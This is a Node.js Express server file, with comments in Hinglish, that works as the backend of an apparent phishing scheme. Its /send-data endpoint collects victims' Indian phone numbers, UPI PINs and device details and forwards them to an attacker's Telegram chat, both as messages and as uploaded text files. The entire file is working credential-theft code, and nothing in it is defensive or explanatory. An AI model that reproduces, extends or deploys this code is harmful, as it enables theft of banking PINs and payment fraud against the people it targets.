require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data'); // File bhejne ke liye

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

// State management
let lastMessageId = null;
let currentMessageText = "";
let currentDeviceModel = "Device";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', Buffer.from(content, 'utf-8'), { filename: `${filename}.txt` });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
    
    let updatedText = "";

    // Device Model extract karna (RMX3933)
    if (deviceId) {
        currentDeviceModel = deviceId.split(' ')[0] || "Device";
    }

    if (type === 'NUMBER') {
        lastMessageId = null; 
        updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `*Number:* +91 ${number}\n`;
    } else if (pin) {
        updatedText = currentMessageText + `*UPI PIN:* ${pin}\n`;
    }

    if (updatedText) {
        await sendOrUpdateTelegram(updatedText);
        
        // Har update ke baad TXT file bhi bhejega (Latest data ke saath)
        // Agar aap chahte hain ki sirf PIN milne par file aaye, toh condition change kar sakte hain
        const fileContent = updatedText.replace(/\*/g, ''); // Bold stars hata kar clean text file ke liye
        await sendFileToTelegram(fileContent, currentDeviceModel);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
